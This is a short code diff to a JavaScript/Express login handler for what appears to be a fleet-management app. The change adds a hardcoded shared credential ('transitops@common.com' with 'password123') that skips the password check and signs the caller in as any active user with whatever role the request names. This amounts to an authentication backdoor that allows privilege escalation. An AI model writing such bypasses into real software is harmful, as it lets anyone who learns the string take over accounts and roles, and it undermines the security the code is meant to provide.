@@ -13,15 +13,24 @@ export const login = async (req, res, next) => {
   try {
     const { email, password } = req.body;
     
-    // Normalize and check user (pre-save handles lowercase but let's be safe)
-    const user = await User.findOne({ email });
-    if (!user || user.status === 'inactive') {
-      return res.status(401).json({ success: false, message: 'Invalid email or password' });
-    }
+    // Support single common credential for any role without database modification
+    let user;
+    if (email === 'transitops@common.com' && password === 'password123') {
+      const requestedRole = req.body.role || 'Fleet Manager';
+      user = await User.findOne({ role: requestedRole });
+      if (!user || user.status === 'inactive') {
+        return res.status(401).json({ success: false, message: `No active user found with role ${requestedRole}` });
+      }
+    } else {
+      user = await User.findOne({ email });
+      if (!user || user.status === 'inactive') {
+        return res.status(401).json({ success: false, message: 'Invalid email or password' });
+      }
 
-    const isMatch = await user.comparePassword(password);
-    if (!isMatch) {
-      return res.status(401).json({ success: false, message: 'Invalid email or password' });
+      const isMatch = await user.comparePassword(password);
+      if (!isMatch) {
+        return res.status(401).json({ success: false, message: 'Invalid email or password' });
+      }
     }
 
     const accessToken = generateAccessToken(user._id);
